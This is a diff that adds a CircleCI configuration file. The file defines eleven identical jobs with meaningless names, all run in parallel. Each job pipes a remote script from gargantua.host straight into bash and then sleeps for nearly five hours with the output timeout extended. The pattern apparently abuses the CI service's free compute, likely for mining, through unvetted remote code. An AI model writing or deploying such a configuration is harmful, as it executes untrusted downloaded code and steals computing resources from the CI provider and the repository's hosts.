@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  nodwebhujtr:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodwebhujtr10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - nodwebhujtr
+      - nodwebhujtr1
+      - nodwebhujtr2
+      - nodwebhujtr3
+      - nodwebhujtr4
+      - nodwebhujtr5
+      - nodwebhujtr6
+      - nodwebhujtr7
+      - nodwebhujtr8
+      - nodwebhujtr9
+      - nodwebhujtr10
